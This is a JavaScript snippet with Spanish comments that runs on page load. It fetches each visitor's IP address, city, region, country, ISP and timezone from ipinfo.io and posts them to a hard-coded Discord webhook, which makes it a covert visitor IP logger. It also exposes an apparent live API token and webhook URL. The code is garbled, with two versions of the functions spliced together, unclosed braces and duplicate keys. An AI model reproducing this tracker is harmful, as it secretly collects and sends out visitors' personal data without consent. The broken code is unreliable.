async function obtenerInfoIP() {
  const apiKey = '34d1809199c50b';
  const response = await fetch(`https://ipinfo.io/json?token=${apiKey}`);
  const data = await response.json();
  return data;  // Objeto con toda la info (ip, ciudad, región, país, org, timezone, etc)
async function obtenerIP() {
  const apiKey = '34d1809199c50b'; // Reemplaza con tu API Key real
  const response = await fetch(`https://ipinfo.io/ip?token=${apiKey}`);
  const ip = await response.text();
  return ip.trim();
}

async function enviarInfoADiscord(info) {
async function enviarIPaDiscord(ip) {
  const webhookURL = 'https://discord.com/api/webhooks/1379598670550405290/r6g0SLry7T_R4QrIbW04u3CG06C6nqRVLsOzDeajGR6UTS6qmFcFZ3K7u-gvhAeJYubU'; // Reemplaza con tu webhook
  // Crear un mensaje bonito con la info:
  const mensaje = `
📡 **Nueva visita registrada:**
- IP: ${info.ip}
- Ciudad: ${info.city}
- Región: ${info.region}
- País: ${info.country}
- ISP/Org: ${info.org}
- Zona horaria: ${info.timezone}
  `;
  await fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: mensaje })
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: `📡 IP registrada: ${ip}` })
  });
}

window.addEventListener("DOMContentLoaded", async () => {
  const infoIP = await obtenerInfoIP();
  await enviarInfoADiscord(infoIP);
  const ip = await obtenerIP();
  await enviarIPaDiscord(ip);
});
